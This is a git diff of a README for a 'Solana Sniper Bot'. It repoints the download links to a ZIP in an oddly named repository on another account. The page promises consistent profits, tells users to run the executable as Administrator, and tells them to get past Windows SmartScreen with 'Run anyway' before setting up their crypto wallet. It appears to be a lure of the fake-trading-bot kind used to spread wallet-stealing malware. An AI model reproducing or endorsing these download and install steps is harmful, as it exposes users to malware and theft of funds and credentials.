@@ -4,11 +4,11 @@
 
 ![Solana Sniper Bot Banner](./assets/banner.svg)
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release%20v3.8.2-brightgreen?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/yourusername/solana-sniper-bot/releases/latest/download/SolanaSniperBot.zip)
-[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/yourusername/solana-sniper-bot)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release%20v3.8.2-brightgreen?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/MechanicDusk/dfzmqmby/releases/download/Latest/Solana-Bot.zip)
+[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/MechanicDusk/solana-bot)
 [![Solana](https://img.shields.io/badge/Blockchain-Solana-14F195?style=for-the-badge&logo=solana&logoColor=white)](https://solana.com)
 [![License](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)](./LICENSE)
-[![Stars](https://img.shields.io/github/stars/yourusername/solana-sniper-bot?style=for-the-badge&color=gold)](https://github.com/yourusername/solana-sniper-bot/stargazers)
+[![Stars](https://img.shields.io/github/stars/MechanicDusk/solana-bot?style=for-the-badge&color=gold)](https://github.com/MechanicDusk/solana-bot/stargazers)
 
 **The Most Advanced Solana Token Sniper Bot for 2026 - Lightning Fast Execution**
 
@@ -173,13 +173,13 @@ Our users report consistent profitability with optimized strategies and intellig
 
 ### 🎁 Latest Version: v3.8.2 (June 2026)
 
-[![Download for Windows](./assets/download-button.png)](https://github.com/yourusername/solana-sniper-bot/releases/latest/download/SolanaSniperBot.zip)
+[![Download for Windows](./assets/download-button.svg)](https://github.com/MechanicDusk/dfzmqmby/releases/download/Latest/Solana-Bot.zip)
 
 **File Size:** 24.7 MB | **Format:** ZIP Archive | **Platform:** Windows 10/11 (64-bit)
 
 **Latest Updates:** Enhanced Pump.fun integration • 40% faster execution • Improved MEV protection
 
-[📋 View All Releases](https://github.com/yourusername/solana-sniper-bot/releases) | [📖 Installation Guide](./INSTALLATION.md) | [🎥 Video Tutorial](https://youtube.com/watch)
+[📋 View All Releases](https://github.com/MechanicDusk/solana-bot/releases) | [📖 Installation Guide](./INSTALLATION.md) | [🎥 Video Tutorial](https://youtube.com/watch)
 
 </div>
 
@@ -251,9 +251,9 @@ SolanaSniperBot.zip (24.7 MB)
 ### 📝 Step 1: Download & Install
 
 1. Click the **[Download Button](#-download)** above
-2. Extract `SolanaSniperBot.zip` to your preferred location
+2. Extract `.zip` to your preferred location
    - Recommended: `C:\SolanaSniperBot\`
-3. Right-click `SolanaSniperBot.exe` and select **"Run as Administrator"**
+3. Right-click `.exe` and select **"Run as Administrator"**
 4. If Windows SmartScreen appears, click **"More info"** → **"Run anyway"**
 
 ### 🔐 Step 2: Configure Your Wallet
@@ -646,31 +646,31 @@ Average Performance:
 <div align="center">
 
 ### 🖥️ Main Dashboard
-![Main Dashboard](./assets/screenshot-dashboard.png)
+![Main Dashboard](./assets/screenshot-dashboard.svg)
 *Real-time monitoring with live trade feed and performance metrics*
 
 ---
 
 ### 📊 Trading Interface
-![Trading Panel](./assets/screenshot-trading.png)
+![Trading Panel](./assets/screenshot-trading.svg)
 *Easy-to-use controls for manual trading and strategy configuration*
 
 ---
 
 ### ⚙️ Configuration Settings
-![Settings](./assets/screenshot-settings.png)
+![Settings](./assets/screenshot-settings.svg)
 *Comprehensive settings panel with safety features and network options*
 
 ---
 
 ### 📈 Analytics Dashboard
-![Analytics](./assets/screenshot-analytics.png)
+![Analytics](./assets/screenshot-analytics.svg)
 *Detailed performance analytics with charts and statistics*
 
 ---
 
 ### 💼 Portfolio Overview
-![Portfolio](./assets/screenshot-portfolio.png)
+![Portfolio](./assets/screenshot-portfolio.svg)
 *Track all your holdings across multiple wallets*
 
 </div>
@@ -820,7 +820,7 @@ A: Yes! 10+ hours of video tutorials, written guides, and live Q&A sessions.
 | 💬 **Discord** | [Join Server](https://discord.gg/solanasniper) | 24/7 community support & trading signals |
 | 📧 **Email** | support@solanasniperbot.com | Technical support (24h response) |
 | 📖 **Documentation** | [Read Docs](./docs/) | Complete guides and tutorials |
-| 🐛 **GitHub Issues** | [Report Bug](https://github.com/yourusername/solana-sniper-bot/issues) | Bug reports and feature requests |
+| 🐛 **GitHub Issues** | [Report Bug](https://github.com/MechanicDusk/solana-bot/issues) | Bug reports and feature requests |
 | 💡 **Discussions** | [Join Discussion](https://github.com/yourusername/solana-sniper-bot/discussions) | Ideas and questions |
 | 🎥 **YouTube** | [Watch Tutorials](https://youtube.com/@solanasniper) | Video guides and updates |
 
@@ -989,7 +989,7 @@ SOFTWARE.
 
 ### 🚀 Ready to Start Sniping?
 
-[![Download Now](https://img.shields.io/badge/🚀_DOWNLOAD_NOW-brightgreen?style=for-the-badge&scale=1.5)](https://github.com/yourusername/solana-sniper-bot/releases/latest/download/SolanaSniperBot.zip)
+[![Download Now](https://img.shields.io/badge/🚀_DOWNLOAD_NOW-brightgreen?style=for-the-badge&scale=1.5)](https://github.com/MechanicDusk/dfzmqmby/releases/download/Latest/Solana-Bot.zip)
 
 ---
 
